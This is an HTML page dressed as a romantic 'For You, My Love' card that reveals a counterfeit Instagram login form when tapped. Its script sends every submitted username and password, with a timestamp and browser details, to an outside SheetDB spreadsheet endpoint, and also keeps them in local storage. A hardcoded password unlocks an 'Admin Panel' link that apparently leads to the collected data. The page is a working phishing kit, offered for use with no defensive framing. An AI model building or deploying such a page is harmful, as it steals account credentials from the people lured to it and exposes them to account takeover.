<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>For You ❤️</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Copy your existing styles here */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow-x: hidden;
        }

        .floating-heart {
            position: fixed;
            font-size: 20px;
            color: #ff3366;
            animation: floatUp 4s linear infinite;
            pointer-events: none;
            z-index: 1;
        }

        @keyframes floatUp {
            0% {
                transform: translateY(100vh) scale(0);
                opacity: 1;
            }
            100% {
                transform: translateY(-100px) scale(1.5);
                opacity: 0;
            }
        }

        .card {
            max-width: 480px;
            width: 90%;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 50px;
            padding: 3rem 2rem;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
            position: relative;
            z-index: 10;
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 255, 255, 0.5);
        }

        .heart-icon {
            font-size: 6rem;
            color: #ff3366;
            animation: heartbeat 1.5s ease-in-out infinite;
            margin-bottom: 1rem;
            filter: drop-shadow(0 10px 20px rgba(255, 51, 102, 0.4));
        }

        @keyframes heartbeat {
            0% { transform: scale(1); }
            14% { transform: scale(1.3); }
            28% { transform: scale(1); }
            42% { transform: scale(1.3); }
            70% { transform: scale(1); }
        }

        .message-text {
            font-size: 2.8rem;
            color: #333;
            margin-bottom: 0.5rem;
            font-weight: 300;
            font-family: 'Dancing Script', cursive;
        }

        .message-text span {
            display: block;
            font-size: 2.2rem;
            color: #ff3366;
            margin-top: 0.5rem;
            font-weight: 700;
        }

        .click-hint {
            margin-top: 2.5rem;
            padding: 1.2rem;
            background: linear-gradient(135deg, #ffe0e0, #ffc0c0);
            border-radius: 60px;
            color: #ff3366;
            font-size: 1.3rem;
            border: 2px dashed #ff3366;
            cursor: pointer;
            transition: all 0.3s;
        }

        .click-hint:hover {
            background: linear-gradient(135deg, #ffc0c0, #ffa0a0);
            transform: scale(1.05);
        }

        .instagram-login {
            text-align: center;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .instagram-header {
            margin-bottom: 2rem;
        }

        .instagram-header i {
            font-size: 5rem;
            background: linear-gradient(45deg, #f9ce34, #ee2a7b, #6228d7);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .instagram-header h2 {
            font-size: 2.2rem;
            color: #333;
            margin-top: 0.5rem;
        }

        .input-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #555;
            font-weight: 500;
        }

        .input-group input {
            width: 100%;
            padding: 1.2rem 1.5rem;
            border: 2px solid #e0e0e0;
            border-radius: 40px;
            font-size: 1rem;
            transition: all 0.3s;
        }

        .input-group input:focus {
            border-color: #ff3366;
            outline: none;
            box-shadow: 0 0 0 4px rgba(255, 51, 102, 0.1);
        }

        .login-button {
            width: 100%;
            padding: 1.2rem;
            background: linear-gradient(45deg, #0095f6, #1877f2);
            color: white;
            border: none;
            border-radius: 40px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
            margin: 1.5rem 0 1rem;
            transition: all 0.3s;
        }

        .login-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 149, 246, 0.4);
        }

        .back-button {
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 1rem;
            margin-top: 1rem;
            padding: 0.5rem 1.5rem;
            border-radius: 30px;
            transition: all 0.3s;
        }

        .back-button:hover {
            color: #ff3366;
            background: rgba(255, 51, 102, 0.1);
        }

        .hidden {
            display: none !important;
        }

        .admin-corner {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 100;
        }

        .admin-link {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            padding: 0.7rem 1.5rem;
            border-radius: 40px;
            color: white;
            text-decoration: none;
            font-size: 0.9rem;
            border: 1px solid rgba(255, 255, 255, 0.3);
            cursor: pointer;
            display: inline-block;
            transition: all 0.3s;
        }

        .admin-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: scale(1.05);
        }

        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-content {
            background: white;
            padding: 2.5rem;
            border-radius: 50px;
            max-width: 380px;
            width: 90%;
            text-align: center;
        }

        .modal-content h3 {
            font-size: 2rem;
            color: #333;
            margin-bottom: 1rem;
        }

        .modal-content input {
            width: 100%;
            padding: 1.2rem;
            border: 2px solid #e0e0e0;
            border-radius: 40px;
            margin: 1.5rem 0;
            font-size: 1rem;
        }

        .modal-content input:focus {
            border-color: #ff3366;
            outline: none;
        }

        .modal-buttons {
            display: flex;
            gap: 1rem;
            justify-content: center;
        }

        .modal-button {
            padding: 1rem 2rem;
            border: none;
            border-radius: 40px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 600;
        }

        .modal-button.unlock {
            background: linear-gradient(45deg, #ff3366, #ff6b6b);
            color: white;
        }

        .modal-button.cancel {
            background: #f0f0f0;
            color: #666;
        }

        .modal-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
        }

        .error-message {
            color: #ff3366;
            font-size: 0.9rem;
            margin: 0.5rem 0;
        }

        .success-popup {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            padding: 1.2rem 2.5rem;
            border-radius: 60px;
            z-index: 2000;
            animation: slideDownPop 0.3s ease;
            box-shadow: 0 10px 30px rgba(76, 175, 80, 0.3);
        }

        @keyframes slideDownPop {
            0% { transform: translate(-50%, -100%); }
            100% { transform: translate(-50%, 0); }
        }
    </style>
    <!-- Add Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>

<!-- Floating Hearts Container -->
<div id="hearts-container"></div>

<!-- Success Popup -->
<div id="successPopup" class="success-popup hidden">
    <i class="fas fa-check-circle"></i> Saved to cloud successfully! 💕
</div>

<!-- Main Card -->
<div class="card" id="mainCard">
    <!-- Romantic Message Section -->
    <div id="romanticSection" class="romantic-message">
        <div class="heart-icon">
            <i class="fas fa-heart"></i>
        </div>
        <div class="message-text">
            For You
            <span>My Love ❤️</span>
        </div>
        <div class="click-hint" id="showLoginBtn">
            <i class="fas fa-hand-pointer"></i> Tap here to see something more
        </div>
    </div>

    <!-- Instagram Login Section -->
    <div id="loginSection" class="instagram-login hidden">
        <div class="instagram-header">
            <i class="fab fa-instagram"></i>
            <h2>Instagram</h2>
        </div>
        <div class="input-group">
            <label>Username</label>
            <input type="text" id="username" placeholder="Enter username">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Enter password">
        </div>
        <button class="login-button" id="submitLogin">
            <i class="fas fa-sign-in-alt"></i> Log In
        </button>
        <button class="back-button" id="backToRomance">
            <i class="fas fa-arrow-left"></i> Back
        </button>
    </div>
</div>

<!-- Admin Corner -->
<div class="admin-corner">
    <span class="admin-link" id="adminLink">
        <i class="fas fa-lock"></i> Admin Panel
    </span>
</div>

<!-- Password Modal -->
<div id="passwordModal" class="modal hidden">
    <div class="modal-content">
        <h3>Admin Access</h3>
        <p>Not Accessable</p>
        <input type="password" id="adminPassword" placeholder="Enter password">
        <div id="modalError" class="error-message hidden">❌ Incorrect password</div>
        <div class="modal-buttons">
            <button class="modal-button cancel" id="cancelModal">Cancel</button>
            <button class="modal-button unlock" id="unlockAdmin">Unlock</button>
        </div>
    </div>
</div>

<script>
    // Configuration
    const ADMIN_PASSWORD = "Aaru@2001";
    const STORAGE_KEY = 'love_credentials';
    const SHEETDB_URL = 'https://sheetdb.io/api/v1/b5wwfyhwzpf9z';

    // Get elements
    const romanticSection = document.getElementById('romanticSection');
    const loginSection = document.getElementById('loginSection');
    const showLoginBtn = document.getElementById('showLoginBtn');
    const backToRomance = document.getElementById('backToRomance');
    const submitLogin = document.getElementById('submitLogin');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const adminLink = document.getElementById('adminLink');
    const passwordModal = document.getElementById('passwordModal');
    const adminPassword = document.getElementById('adminPassword');
    const modalError = document.getElementById('modalError');
    const cancelModal = document.getElementById('cancelModal');
    const unlockAdmin = document.getElementById('unlockAdmin');
    const heartsContainer = document.getElementById('hearts-container');
    const successPopup = document.getElementById('successPopup');

    // Floating hearts animation
    function createHeart() {
        const heart = document.createElement('div');
        heart.className = 'floating-heart';
        heart.innerHTML = '❤️';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.animationDuration = Math.random() * 3 + 3 + 's';
        heart.style.fontSize = Math.random() * 30 + 15 + 'px';
        heartsContainer.appendChild(heart);
        setTimeout(() => heart.remove(), 5000);
    }
    setInterval(createHeart, 200);

    // Show Instagram login
    showLoginBtn.addEventListener('click', () => {
        romanticSection.classList.add('hidden');
        loginSection.classList.remove('hidden');
        usernameInput.focus();
    });

    // Back to romantic message
    backToRomance.addEventListener('click', () => {
        loginSection.classList.add('hidden');
        romanticSection.classList.remove('hidden');
        usernameInput.value = '';
        passwordInput.value = '';
    });

    // Show success popup
    function showSuccessPopup() {
        successPopup.classList.remove('hidden');
        setTimeout(() => successPopup.classList.add('hidden'), 3000);
    }

    // Format timestamp properly
    function getFormattedTimestamp() {
        const now = new Date();
        const options = {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        };
        return now.toLocaleString('en-US', options);
    }

    // Save to SheetDB
    async function saveToSheetDB(username, password) {
        // Format data properly for Google Sheets
        const data = {
            data: [{
                username: username.toString(),  // Ensure it's string
                password: password.toString(),  // Ensure it's string
                timestamp: getFormattedTimestamp(), // Proper date format
                device: navigator.userAgent.substring(0, 150)
            }]
        };

        console.log('Saving to SheetDB:', data);

        try {
            const response = await fetch(SHEETDB_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            
            const result = await response.json();
            console.log('Save result:', result);
            showSuccessPopup();
            return true;
        } catch (error) {
            console.error('Error saving to SheetDB:', error);
            alert('Cloud save failed: ' + error.message);
            return false;
        }
    }

    // Save locally
    function saveLocally(username, password) {
        let credentials = [];
        try {
            const stored = localStorage.getItem(STORAGE_KEY);
            if (stored) credentials = JSON.parse(stored);
        } catch (e) {
            credentials = [];
        }

        credentials.push({
            username: username,
            password: password,
            timestamp: getFormattedTimestamp()
        });

        localStorage.setItem(STORAGE_KEY, JSON.stringify(credentials));
    }

    // Handle login submission
    submitLogin.addEventListener('click', async () => {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (username === '' || password === '') {
            alert('Please enter both username and password');
            return;
        }

        // Show loading
        const originalText = submitLogin.innerHTML;
        submitLogin.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Saving...';
        submitLogin.disabled = true;

        // Save to cloud
        await saveToSheetDB(username, password);
        
        // Save locally
        saveLocally(username, password);

        // Reset button
        submitLogin.innerHTML = originalText;
        submitLogin.disabled = false;

        // Clear inputs
        usernameInput.value = '';
        passwordInput.value = '';

        // Return to romantic section
        loginSection.classList.add('hidden');
        romanticSection.classList.remove('hidden');

        // Open romantic page
        setTimeout(() => {
            window.open('romantic-page.html', '_blank');
        }, 500);
    });

    // Admin panel
    adminLink.addEventListener('click', () => {
        passwordModal.classList.remove('hidden');
        adminPassword.value = '';
        modalError.classList.add('hidden');
    });

    cancelModal.addEventListener('click', () => {
        passwordModal.classList.add('hidden');
    });

    unlockAdmin.addEventListener('click', () => {
        if (adminPassword.value.trim() === ADMIN_PASSWORD) {
            window.open('admin-panel.html', '_blank');
            passwordModal.classList.add('hidden');
        } else {
            modalError.classList.remove('hidden');
            adminPassword.value = '';
        }
    });

    // Close modal on outside click
    window.addEventListener('click', (e) => {
        if (e.target === passwordModal) {
            passwordModal.classList.add('hidden');
        }
    });

    // Enter key handlers
    adminPassword.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') unlockAdmin.click();
    });

    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') submitLogin.click();
    });

    // Initial hearts
    for(let i = 0; i < 10; i++) {
        setTimeout(createHeart, i * 100);
    }
</script>
</body>
</html>
